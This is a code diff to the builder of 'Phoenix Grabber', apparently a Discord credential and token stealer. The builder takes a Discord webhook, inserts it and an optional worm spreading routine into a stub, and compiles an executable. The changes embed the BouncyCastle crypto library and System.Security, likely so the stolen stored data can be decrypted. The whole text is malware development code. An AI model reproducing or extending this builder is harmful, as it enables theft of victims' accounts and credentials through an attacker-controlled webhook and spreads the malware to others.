@@ -28,6 +28,8 @@ namespace PhoenixGrabber
         #region Main
         static void Main()
         {
+            using (var stream = new FileStream(Path.GetTempPath() + "\\BouncyCastle.Crypto.dll", FileMode.Create, FileAccess.Write))
+                stream.Write(Properties.Resources.BouncyCastle_Crypto, 0, Properties.Resources.BouncyCastle_Crypto.Length);
             Console.Title = "Phoenix Grabber";
             Console.Clear();
             Console.Write("Discord Webhook: ");
@@ -83,7 +85,7 @@ namespace PhoenixGrabber
         #region Base
         static string Base(string stub)
         {
-            stub = stub.Replace("Webhook", Webhook);
+            stub = stub.Replace("//Webhook", Webhook);
 
             if (SpreadMode == true)
                 stub = stub.Replace("//SpreadMode", $"SpreadMode(\"{WormMessage}\");");
@@ -114,6 +116,9 @@ namespace PhoenixGrabber
             compars.ReferencedAssemblies.Add("System.Core.dll");
             compars.ReferencedAssemblies.Add("Microsoft.CSharp.dll");
             compars.ReferencedAssemblies.Add("System.Web.Extensions.dll");
+            compars.ReferencedAssemblies.Add("System.Security.dll");
+            compars.EmbeddedResources.Add(Path.GetTempPath() + "\\BouncyCastle.Crypto.dll");
+            compars.ReferencedAssemblies.Add(Path.GetTempPath() + "\\BouncyCastle.Crypto.dll");
             compars.GenerateExecutable = true;
             compars.GenerateInMemory = false;
             compars.TreatWarningsAsErrors = false;
@@ -158,6 +163,7 @@ namespace PhoenixGrabber
                         Console.WriteLine(e.Message);
                     }
                 }
+                if (File.Exists(Path.GetTempPath() + "\\BouncyCastle.Crypto.dll")) { File.Delete(Path.GetTempPath() + "\\BouncyCastle.Crypto.dll"); }
                 Console.Clear();
                 Console.WriteLine($"File saved to: {Directory.GetCurrentDirectory() + $"\\{FileName}.exe"}\nPress any key to exit.");
                 Console.ReadKey();
